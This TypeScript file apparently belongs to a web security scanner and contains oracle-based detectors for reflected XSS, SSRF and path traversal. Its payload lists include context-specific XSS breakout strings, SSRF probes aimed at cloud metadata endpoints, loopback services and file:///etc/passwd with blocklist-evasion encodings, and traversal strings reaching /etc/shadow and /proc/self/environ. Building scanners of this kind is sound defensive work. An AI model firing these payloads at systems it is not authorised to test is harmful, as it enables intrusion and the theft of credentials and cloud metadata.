// InjectProof — Oracle-driven XSS, SSRF, and Path Traversal detectors
//
// XSS: Instead of a static payload list, we probe the reflection context
// first (where does the canary land in the HTML?) and synthesise payloads
// specific to that context — script-block break-out differs from attribute
// injection which differs from href/URL injection. The oracle then confirms
// whether the DOM structure actually changed, ruling out mere reflection.
//
// SSRF: Param name semantics drive payload selection. A parameter named
// "url", "callback", or "endpoint" is a different risk profile from a
// generic "q" param. Timing + status anomalies serve as the oracle signal.
//
// PathTraversal: Param name and existing value depth drive traversal depth.
// Content and structure changes after traversal are the oracle signal.

import type { CrawledEndpoint, DetectorResult, DiscoveredParam } from '@/types';
import { runOracleDetection, type OraclePayload } from './oracle-detector';
import { generateProbeToken } from '@/scanner/payloads';

export interface OracleXssConfig {
    requestTimeout: number;
    userAgent: string;
    extraHeaders?: Record<string, string>;
    maxFindings?: number;
}

// ============================================================
// XSS reflection context taxonomy
// ============================================================

type XssContext =
    | 'script-block'      // <script>...CANARY...</script>
    | 'attribute-double'  // <tag attr="CANARY">
    | 'attribute-single'  // <tag attr='CANARY'>
    | 'event-handler'     // onX="...CANARY..."
    | 'url-attr'          // href/src/action="CANARY"
    | 'html-comment'      // <!-- CANARY -->
    | 'style-block'       // <style>...CANARY...</style>
    | 'html-text'         // <div>CANARY</div>
    | 'none';             // canary not reflected

function inferXssContext(body: string, token: string): XssContext {
    const idx = body.indexOf(token);
    if (idx === -1) return 'none';

    const W = 300;
    const pre = body.slice(Math.max(0, idx - W), idx);

    // Script block: last <script open is after the last </script>
    const lastScriptOpen = pre.lastIndexOf('<script');
    const lastScriptClose = pre.lastIndexOf('</script');
    if (lastScriptOpen !== -1 && lastScriptOpen > lastScriptClose) return 'script-block';

    // Style block
    const lastStyleOpen = pre.lastIndexOf('<style');
    const lastStyleClose = pre.lastIndexOf('</style');
    if (lastStyleOpen !== -1 && lastStyleOpen > lastStyleClose) return 'style-block';

    // HTML comment
    if (pre.lastIndexOf('<!--') > pre.lastIndexOf('-->')) return 'html-comment';

    // Inside an event-handler attribute (on*)
    if (/on\w+\s*=\s*["']?[^"'<>]*$/.test(pre)) return 'event-handler';

    // Inside href/src/action/data/ping — URL-type attribute
    if (/(?:href|src|action|formaction|data|ping)\s*=\s*["']?[^"'<>]*$/i.test(pre)) return 'url-attr';

    // Inside a double-quoted attribute value
    const lastDq = pre.lastIndexOf('"');
    const lastSq = pre.lastIndexOf("'");
    if (lastDq > lastSq) return 'attribute-double';
    if (lastSq > lastDq) return 'attribute-single';

    return 'html-text';
}

// ============================================================
// Context-specific payload synthesis
// ============================================================

function buildXssPayloads(token: string, context: XssContext): OraclePayload[] {
    // Payloads are crafted to break out of exactly the observed embedding.
    // The canary token is embedded in window[token] so the oracle's newTokens
    // axis fires when the token appears inside an executable JS context.
    switch (context) {
        case 'script-block':
            return [
                { value: `';window["${token}"]=1//`,                  label: 'script:sq-break' },
                { value: `";window["${token}"]=1//`,                  label: 'script:dq-break' },
                { value: `\`;window["${token}"]=1//`,                 label: 'script:tl-break' },
                { value: `</script><script>window["${token}"]=1</script>`, label: 'script:tag-close' },
            ];
        case 'attribute-double':
            return [
                { value: `" onfocus="window['${token}']=1" autofocus="`, label: 'attr-dq:onfocus' },
                { value: `" onmouseover="window['${token}']=1" x="`,     label: 'attr-dq:onmouse' },
                { value: `"><svg onload="window['${token}']=1">`,         label: 'attr-dq:svg' },
                { value: `"><script>window["${token}"]=1</script>`,       label: 'attr-dq:script' },
            ];
        case 'attribute-single':
            return [
                { value: `' onfocus='window["${token}"]=1' autofocus='`, label: 'attr-sq:onfocus' },
                { value: `'><script>window["${token}"]=1</script>`,      label: 'attr-sq:script' },
                { value: `'><svg onload='window["${token}"]=1'>`,        label: 'attr-sq:svg' },
            ];
        case 'event-handler':
            return [
                { value: `window['${token}']=1`,          label: 'event:direct' },
                { value: `');window['${token}']=1//`,     label: 'event:sq-break' },
                { value: `");window['${token}']=1//`,     label: 'event:dq-break' },
            ];
        case 'url-attr':
            return [
                { value: `javascript:window['${token}']=1`,                          label: 'url:js-uri' },
                { value: `data:text/html,<script>window['${token}']=1</script>`,     label: 'url:data-uri' },
                { value: `javascript://x%0awindow['${token}']=1`,                    label: 'url:js-comment' },
            ];
        case 'html-comment':
            return [
                { value: `--><script>window["${token}"]=1</script><!--`,   label: 'comment:break' },
                { value: `-->"><svg onload="window['${token}']=1"><!--`,   label: 'comment:svg' },
            ];
        case 'style-block':
            return [
                { value: `</style><script>window["${token}"]=1</script>`, label: 'style:close' },
                { value: `}expression(window['${token}']=1){`,            label: 'style:expr' },
            ];
        case 'none':
        case 'html-text':
        default:
            // No known reflection context — use a diverse set that covers the most
            // common HTML injection points. Oracle still validates DOM change.
            return [
                { value: `<script>window["${token}"]=1</script>`,           label: 'text:script' },
                { value: `<svg onload="window['${token}']=1">`,             label: 'text:svg' },
                { value: `<img src=x onerror="window['${token}']=1">`,      label: 'text:img-onerror' },
                { value: `<details open ontoggle="window['${token}']=1">`,  label: 'text:details' },
                { value: `"><script>${token}</script>`,                      label: 'text:attr-break' },
            ];
    }
}

// ============================================================
// Canary probe — sends token and classifies reflection
// ============================================================

async function probeReflectionContext(
    url: string,
    param: DiscoveredParam,
    token: string,
    config: OracleXssConfig,
): Promise<XssContext> {
    try {
        const headers: Record<string, string> = {
            'User-Agent': config.userAgent,
            ...config.extraHeaders,
        };
        const fetchUrl = new URL(url);
        let body: string | undefined;
        if (param.type === 'query') {
            fetchUrl.searchParams.set(param.name, token);
        } else {
            headers['Content-Type'] = 'application/x-www-form-urlencoded';
            body = `${encodeURIComponent(param.name)}=${encodeURIComponent(token)}`;
        }
        const controller = new AbortController();
        const timer = setTimeout(() => controller.abort(), config.requestTimeout);
        const res = await fetch(fetchUrl.toString(), {
            method: body ? 'POST' : 'GET',
            headers,
            body,
            signal: controller.signal,
            redirect: 'manual',
        });
        clearTimeout(timer);
        return inferXssContext(await res.text(), token);
    } catch {
        return 'none';
    }
}

// ============================================================
// XSS detector
// ============================================================

export async function detectXssWithOracle(
    endpoint: CrawledEndpoint,
    config: OracleXssConfig,
): Promise<DetectorResult[]> {
    const results: DetectorResult[] = [];
    const injectable = endpoint.params.filter((p) => p.type === 'query' || p.type === 'body');

    for (const param of injectable) {
        const token = generateProbeToken();

        // Phase A: discover where the token lands in the response
        const reflectionContext = await probeReflectionContext(endpoint.url, param, token, config);

        // Phase B: synthesise payloads targeting that specific embedding
        const payloads = buildXssPayloads(token, reflectionContext);

        // Phase C: oracle validates DOM structural change
        const findings = await runOracleDetection({
            url: endpoint.url,
            method: param.type === 'query' ? 'GET' : 'POST',
            param,
            payloads,
            category: 'xss',
            cweId: 'CWE-79',
            cvssKey: 'xss_reflected',
            severityFloor: 'medium',
            requestTimeout: config.requestTimeout,
            userAgent: config.userAgent,
            extraHeaders: config.extraHeaders,
            maxFindings: config.maxFindings ?? 1,
            describe: (paramName) => ({
                title: `Reflected XSS in "${paramName}" via ${reflectionContext} context (oracle-confirmed)`,
                description:
                    `The parameter "${paramName}" at ${endpoint.url} reflects into a ${reflectionContext} context. ` +
                    `Payloads crafted for that embedding caused a DOM structural change beyond the baseline manifold. ` +
                    `The anomaly reproduced under replay and the benign counter-factual returned to in-manifold.`,
                impact:
                    'JavaScript execution in the victim browser: session theft, account takeover, keystroke capture. ' +
                    'Apply context-appropriate output encoding and enforce a strict Content-Security-Policy.',
            }),
        });
        results.push(...findings);
    }
    return results;
}

// ============================================================
// SSRF detector — semantics-driven payload selection
// ============================================================

// Parameters whose names suggest they accept a URL or host value.
// High semantic overlap with SSRF entry points in real applications.
const SSRF_URL_PARAMS = new Set([
    'url', 'uri', 'link', 'href', 'src', 'target', 'redirect', 'return', 'returnto',
    'callback', 'callbackurl', 'next', 'nexturl', 'dest', 'destination', 'endpoint',
    'api', 'apiurl', 'host', 'hostname', 'proxy', 'fetch', 'load', 'img', 'image',
    'resource', 'action', 'to', 'out', 'ref', 'redir', 'location', 'origin',
]);

function buildSsrfPayloads(param: DiscoveredParam): OraclePayload[] {
    const lower = param.name.toLowerCase();
    const isUrlParam = SSRF_URL_PARAMS.has(lower);

    // Core payload set: targets that produce timing or content anomalies when
    // a server-side fetch is triggered. Oracle measures timing + status change.
    const core: OraclePayload[] = [
        { value: 'http://169.254.169.254/latest/meta-data/', label: 'ssrf:aws-imds' },
        { value: 'http://169.254.169.254/',                  label: 'ssrf:metadata-root' },
        { value: 'http://localhost/',                         label: 'ssrf:localhost' },
        { value: 'http://0.0.0.0/',                          label: 'ssrf:zero-addr' },
        { value: 'http://[::1]/',                            label: 'ssrf:ipv6-loopback' },
        { value: 'http://127.0.0.1:22/',                     label: 'ssrf:ssh-port' },
        { value: 'file:///etc/passwd',                        label: 'ssrf:file-passwd' },
        { value: 'dict://127.0.0.1:11211/',                  label: 'ssrf:memcached' },
        { value: 'gopher://127.0.0.1:6379/_PING\r\n',        label: 'ssrf:redis' },
    ];

    if (!isUrlParam) return core.slice(0, 5); // fewer probes for non-URL params

    // URL-type params: also add bypass variants that evade naive blocklists
    return [
        ...core,
        { value: '//169.254.169.254/latest/meta-data/', label: 'ssrf:proto-relative' },
        { value: 'http://2130706433/',                   label: 'ssrf:decimal-127' },  // 127.0.0.1
        { value: 'http://0177.0.0.01/',                  label: 'ssrf:octal-127' },
        { value: 'http://127.1/',                         label: 'ssrf:short-loopback' },
    ];
}

export async function detectSsrfWithOracle(
    endpoint: CrawledEndpoint,
    config: OracleXssConfig,
): Promise<DetectorResult[]> {
    const results: DetectorResult[] = [];
    const injectable = endpoint.params.filter((p) => p.type === 'query' || p.type === 'body');

    for (const param of injectable) {
        const payloads = buildSsrfPayloads(param);
        const findings = await runOracleDetection({
            url: endpoint.url,
            method: param.type === 'query' ? 'GET' : 'POST',
            param,
            payloads,
            category: 'ssrf',
            cweId: 'CWE-918',
            cvssKey: 'ssrf',
            severityFloor: 'high',
            requestTimeout: config.requestTimeout,
            userAgent: config.userAgent,
            extraHeaders: config.extraHeaders,
            maxFindings: config.maxFindings ?? 1,
            describe: (paramName) => ({
                title: `Server-Side Request Forgery in "${paramName}" (oracle-confirmed)`,
                description:
                    `The parameter "${paramName}" at ${endpoint.url} produced timing and/or content anomalies ` +
                    `consistent with a server-side outbound fetch. The oracle replayed the anomaly and confirmed ` +
                    `the benign counter-factual returned to baseline.`,
                impact:
                    'Internal service enumeration, cloud metadata exfiltration (AWS IMDS, GCP metadata), ' +
                    'potential pivot to private networks. Validate and allowlist permitted URL schemes and hosts.',
            }),
        });
        results.push(...findings);
    }
    return results;
}

// ============================================================
// Path Traversal detector — depth-adaptive payload generation
// ============================================================

const PATH_PARAM_INDICATORS = new Set([
    'file', 'path', 'page', 'template', 'lang', 'language', 'locale', 'include',
    'document', 'doc', 'name', 'filename', 'load', 'src', 'view', 'layout', 'module',
    'section', 'content', 'type', 'format', 'dir', 'folder', 'resource', 'item',
]);

function buildTraversalPayloads(param: DiscoveredParam): OraclePayload[] {
    const lower = param.name.toLowerCase();
    const isPathParam = PATH_PARAM_INDICATORS.has(lower);

    // Infer likely traversal depth from the existing parameter value.
    // A value of "en/about/team" implies 2 levels — traverse at least 4.
    const existingValue = param.value ?? '';
    const depth = Math.max(4, (existingValue.match(/[/\\]/g) ?? []).length + 2);
    const seq = '../'.repeat(depth);
    const seqWin = '..\\'.repeat(depth);
    const seqEncoded = '%2e%2e%2f'.repeat(depth);
    const seqDouble = '....//'.repeat(depth);

    const targets = isPathParam
        ? ['etc/passwd', 'etc/shadow', 'proc/self/environ', 'windows/win.ini', 'windows/system32/drivers/etc/hosts']
        : ['etc/passwd', 'windows/win.ini'];

    const payloads: OraclePayload[] = [];
    for (const target of targets) {
        const leaf = target.split('/').pop() ?? target;
        payloads.push(
            { value: `${seq}${target}`,                            label: `traversal:unix-${leaf}` },
            { value: `${seqWin}${target.replace(/\//g, '\\')}`,   label: `traversal:win-${leaf}` },
            { value: `${seqEncoded}${target}`,                    label: `traversal:url-enc-${leaf}` },
            { value: `${seqDouble}${target}`,                     label: `traversal:double-dot-${leaf}` },
        );
    }
    return payloads;
}

export async function detectPathTraversalWithOracle(
    endpoint: CrawledEndpoint,
    config: OracleXssConfig,
): Promise<DetectorResult[]> {
    const results: DetectorResult[] = [];
    const injectable = endpoint.params.filter((p) => p.type === 'query' || p.type === 'body');

    for (const param of injectable) {
        const payloads = buildTraversalPayloads(param);
        const findings = await runOracleDetection({
            url: endpoint.url,
            method: param.type === 'query' ? 'GET' : 'POST',
            param,
            payloads,
            category: 'path_traversal',
            cweId: 'CWE-22',
            cvssKey: 'path_traversal',
            severityFloor: 'high',
            requestTimeout: config.requestTimeout,
            userAgent: config.userAgent,
            extraHeaders: config.extraHeaders,
            maxFindings: config.maxFindings ?? 1,
            describe: (paramName) => ({
                title: `Path Traversal in "${paramName}" (oracle-confirmed)`,
                description:
                    `The parameter "${paramName}" at ${endpoint.url} accepted traversal sequences ` +
                    `that produced a content or structure change beyond the baseline manifold. ` +
                    `The oracle replayed the anomaly and confirmed it disappeared under benign probes.`,
                impact:
                    'Arbitrary file read: source code, credentials, private keys, /etc/passwd. ' +
                    'Sanitise path inputs with realpath() and enforce a chroot/jail for file operations.',
            }),
        });
        results.push(...findings);
    }
    return results;
}
